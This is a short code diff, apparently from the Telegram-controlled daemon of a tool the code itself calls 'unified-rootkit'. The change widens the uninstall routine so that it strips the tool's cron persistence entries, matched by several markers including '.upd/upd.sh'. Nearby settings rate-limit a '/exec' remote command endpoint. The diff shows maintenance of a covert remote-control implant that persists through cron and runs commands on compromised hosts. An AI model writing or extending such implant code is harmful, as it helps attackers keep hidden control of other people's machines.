@@ -16,7 +16,7 @@ TRUNC = 4000
 EXEC_TIMEOUT = 10
 MIN_EXEC_GAP = 2.0        # detik antar /exec
 MAX_EXEC_PER_MIN = 10
-UNINSTALL_MARKER = "# unified-rootkit"   # penanda baris cron milik kita
+CRON_MARKERS = ("# unified-rootkit", ".upd/upd.sh", "control/telegram/daemon.py")   # baris cron kita: lama & baru
 
 
 def _trunc(s):
@@ -130,7 +130,8 @@ def cmd_uninstall(ctx, arg):
         cur = subprocess.run(["crontab", "-l"], stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE,
                              universal_newlines=True, timeout=5).stdout
-        lines = [l for l in cur.splitlines() if UNINSTALL_MARKER not in l]
+        lines = [l for l in cur.splitlines()
+                 if not any(m in l for m in CRON_MARKERS)]
         subprocess.run(["crontab", "-"], input="\n".join(lines) + "\n",
                        universal_newlines=True, timeout=5,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
